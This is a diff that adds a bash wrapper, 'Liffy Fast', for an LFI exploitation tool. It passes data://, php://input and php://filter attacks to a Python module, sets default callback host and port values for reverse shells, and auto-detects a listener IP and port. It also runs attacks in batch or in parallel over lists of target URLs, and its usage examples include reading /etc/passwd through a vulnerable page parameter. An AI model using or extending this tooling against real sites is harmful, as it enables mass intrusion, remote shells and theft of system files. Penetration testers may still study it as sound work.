@@ -1,0 +1,326 @@
+#!/bin/bash
+# Liffy Fast - Quick LFI testing wrapper for xargs and parallel
+
+# Colors for output
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+NC='\033[0m' # No Color
+
+# Default values
+DEFAULT_LHOST="192.168.1.100"
+DEFAULT_LPORT="4444"
+DEFAULT_THREADS="4"
+DEFAULT_TIMEOUT="30"
+
+# Function to show usage
+show_usage() {
+    echo -e "${BLUE}Liffy Fast - Quick LFI testing wrapper${NC}"
+    echo ""
+    echo "Usage:"
+    echo "  liffy-fast [technique] [options]"
+    echo ""
+    echo "Techniques:"
+    echo "  data     - data:// technique"
+    echo "  input    - php://input technique"
+    echo "  filter   - php://filter technique"
+    echo "  auto     - automatic technique detection"
+    echo ""
+    echo "Options:"
+    echo "  --url URL              Target URL with LFI parameter"
+    echo "  --lhost IP             Callback host (default: $DEFAULT_LHOST)"
+    echo "  --lport PORT           Callback port (default: $DEFAULT_LPORT)"
+    echo "  --auto-ip              Auto-detect IP address"
+    echo "  --auto-port            Auto-detect available port"
+    echo "  --file FILE            File to read (for filter technique)"
+    echo "  --batch                Process URLs from stdin"
+    echo "  --parallel             Process URLs in parallel"
+    echo "  --json                 Output results in JSON format"
+    echo "  --threads N            Number of parallel threads (default: $DEFAULT_THREADS)"
+    echo "  --timeout N            Request timeout in seconds (default: $DEFAULT_TIMEOUT)"
+    echo "  --cookies COOKIES      Session cookies"
+    echo "  --user-agent UA        Custom User-Agent string"
+    echo "  --proxy PROXY          HTTP proxy (http://proxy:port)"
+    echo "  --verbose              Verbose output"
+    echo "  --output FILE          Output file for logs"
+    echo ""
+    echo "Examples:"
+    echo "  # Single URL testing"
+    echo "  liffy-fast data --url 'http://target/file.php?page=' --lhost 192.168.1.100 --lport 4444"
+    echo ""
+    echo "  # Batch processing with xargs"
+    echo "  cat urls.txt | xargs -I {} liffy-fast data --url '{}' --lhost 192.168.1.100 --lport 4444"
+    echo ""
+    echo "  # Parallel batch processing"
+    echo "  cat urls.txt | liffy-fast data --batch --parallel --lhost 192.168.1.100 --lport 4444"
+    echo ""
+    echo "  # Filter technique for file reading"
+    echo "  liffy-fast filter --url 'http://target/file.php?page=' --file '/etc/passwd'"
+    echo ""
+    echo "  # Auto technique detection"
+    echo "  liffy-fast auto --url 'http://target/file.php?page=' --auto-ip --auto-port"
+    echo ""
+    echo "  # JSON output for further processing"
+    echo "  cat urls.txt | liffy-fast data --batch --json --lhost 192.168.1.100 --lport 4444"
+    echo ""
+    echo "  # Using with parallel command"
+    echo "  cat urls.txt | parallel -j 4 'liffy-fast data --url {} --lhost 192.168.1.100 --lport 4444'"
+    echo ""
+    echo "  # Using with GNU parallel for advanced processing"
+    echo "  cat urls.txt | parallel --colsep ' ' 'liffy-fast {1} --url {2} --lhost 192.168.1.100 --lport 4444'"
+}
+
+# Function to check if required tools are installed
+check_dependencies() {
+    local missing_deps=()
+    
+    if ! command -v python3 &> /dev/null; then
+        missing_deps+=("python3")
+    fi
+    
+    if ! command -v xargs &> /dev/null; then
+        missing_deps+=("xargs")
+    fi
+    
+    if ! command -v parallel &> /dev/null; then
+        echo -e "${YELLOW}Warning: GNU parallel not found. Install it for better parallel processing.${NC}"
+    fi
+    
+    if [ ${#missing_deps[@]} -ne 0 ]; then
+        echo -e "${RED}Error: Missing required dependencies: ${missing_deps[*]}${NC}"
+        exit 1
+    fi
+}
+
+# Function to auto-detect IP address
+auto_detect_ip() {
+    # Try to get the primary IP address
+    local ip=$(ip route get 8.8.8.8 2>/dev/null | grep -oP 'src \K\S+' | head -1)
+    if [ -z "$ip" ]; then
+        ip=$(hostname -I 2>/dev/null | awk '{print $1}')
+    fi
+    if [ -z "$ip" ]; then
+        ip=$(ifconfig 2>/dev/null | grep -oP 'inet \K\S+' | grep -v '127.0.0.1' | head -1)
+    fi
+    echo "$ip"
+}
+
+# Function to find available port
+find_available_port() {
+    local start_port=${1:-4444}
+    local port=$start_port
+    
+    while [ $port -le 65535 ]; do
+        if ! netstat -tuln 2>/dev/null | grep -q ":$port "; then
+            echo $port
+            return
+        fi
+        port=$((port + 1))
+    done
+    
+    echo "No available port found"
+    exit 1
+}
+
+# Function to process arguments
+process_args() {
+    local technique=""
+    local args=()
+    local auto_ip=false
+    local auto_port=false
+    
+    # Check if first argument is a technique
+    case "$1" in
+        data|input|filter|auto)
+            technique="$1"
+            shift
+            ;;
+        --help|-h|help)
+            show_usage
+            exit 0
+            ;;
+        *)
+            echo -e "${RED}Error: Unknown technique '$1'${NC}"
+            show_usage
+            exit 1
+            ;;
+    esac
+    
+    # Process remaining arguments
+    while [[ $# -gt 0 ]]; do
+        case $1 in
+            --auto-ip)
+                auto_ip=true
+                shift
+                ;;
+            --auto-port)
+                auto_port=true
+                shift
+                ;;
+            --lhost)
+                if [ "$2" ]; then
+                    args+=("--lhost" "$2")
+                    shift 2
+                else
+                    echo -e "${RED}Error: --lhost requires a value${NC}"
+                    exit 1
+                fi
+                ;;
+            --lport)
+                if [ "$2" ]; then
+                    args+=("--lport" "$2")
+                    shift 2
+                else
+                    echo -e "${RED}Error: --lport requires a value${NC}"
+                    exit 1
+                fi
+                ;;
+            --file)
+                if [ "$2" ]; then
+                    args+=("--file" "$2")
+                    shift 2
+                else
+                    echo -e "${RED}Error: --file requires a value${NC}"
+                    exit 1
+                fi
+                ;;
+            --threads)
+                if [ "$2" ]; then
+                    args+=("--threads" "$2")
+                    shift 2
+                else
+                    echo -e "${RED}Error: --threads requires a value${NC}"
+                    exit 1
+                fi
+                ;;
+            --timeout)
+                if [ "$2" ]; then
+                    args+=("--timeout" "$2")
+                    shift 2
+                else
+                    echo -e "${RED}Error: --timeout requires a value${NC}"
+                    exit 1
+                fi
+                ;;
+            --cookies)
+                if [ "$2" ]; then
+                    args+=("--cookies" "$2")
+                    shift 2
+                else
+                    echo -e "${RED}Error: --cookies requires a value${NC}"
+                    exit 1
+                fi
+                ;;
+            --user-agent)
+                if [ "$2" ]; then
+                    args+=("--user-agent" "$2")
+                    shift 2
+                else
+                    echo -e "${RED}Error: --user-agent requires a value${NC}"
+                    exit 1
+                fi
+                ;;
+            --proxy)
+                if [ "$2" ]; then
+                    args+=("--proxy" "$2")
+                    shift 2
+                else
+                    echo -e "${RED}Error: --proxy requires a value${NC}"
+                    exit 1
+                fi
+                ;;
+            --output)
+                if [ "$2" ]; then
+                    args+=("--output" "$2")
+                    shift 2
+                else
+                    echo -e "${RED}Error: --output requires a value${NC}"
+                    exit 1
+                fi
+                ;;
+            --url)
+                if [ "$2" ]; then
+                    args+=("--url" "$2")
+                    shift 2
+                else
+                    echo -e "${RED}Error: --url requires a value${NC}"
+                    exit 1
+                fi
+                ;;
+            --batch|--parallel|--json|--verbose|-v)
+                args+=("$1")
+                shift
+                ;;
+            *)
+                echo -e "${RED}Error: Unknown option '$1'${NC}"
+                show_usage
+                exit 1
+                ;;
+        esac
+    done
+    
+    # Auto-detect IP if requested
+    if [ "$auto_ip" = true ]; then
+        local detected_ip=$(auto_detect_ip)
+        if [ -n "$detected_ip" ]; then
+            args+=("--lhost" "$detected_ip")
+            echo -e "${GREEN}Auto-detected IP: $detected_ip${NC}"
+        else
+            echo -e "${RED}Error: Could not auto-detect IP address${NC}"
+            exit 1
+        fi
+    fi
+    
+    # Auto-detect port if requested
+    if [ "$auto_port" = true ]; then
+        local detected_port=$(find_available_port)
+        if [ -n "$detected_port" ]; then
+            args+=("--lport" "$detected_port")
+            echo -e "${GREEN}Auto-detected port: $detected_port${NC}"
+        else
+            echo -e "${RED}Error: Could not find available port${NC}"
+            exit 1
+        fi
+    fi
+    
+    # Set default values if not provided (only for techniques that need them)
+    if [[ "$technique" == "data" || "$technique" == "input" || "$technique" == "auto" ]]; then
+        if ! echo "${args[*]}" | grep -q -- "--lhost"; then
+            args+=("--lhost" "$DEFAULT_LHOST")
+        fi
+        
+        if ! echo "${args[*]}" | grep -q -- "--lport"; then
+            args+=("--lport" "$DEFAULT_LPORT")
+        fi
+    fi
+    
+    if ! echo "${args[*]}" | grep -q -- "--threads"; then
+        args+=("--threads" "$DEFAULT_THREADS")
+    fi
+    
+    if ! echo "${args[*]}" | grep -q -- "--timeout"; then
+        args+=("--timeout" "$DEFAULT_TIMEOUT")
+    fi
+    
+    # Execute the technique
+    python3 liffy_techniques.py "$technique" "${args[@]}"
+}
+
+# Main execution
+main() {
+    # Check dependencies
+    check_dependencies
+    
+    # Check if any arguments provided
+    if [ $# -eq 0 ]; then
+        show_usage
+        exit 1
+    fi
+    
+    # Process arguments and execute
+    process_args "$@"
+}
+
+# Run main function with all arguments
+main "$@"
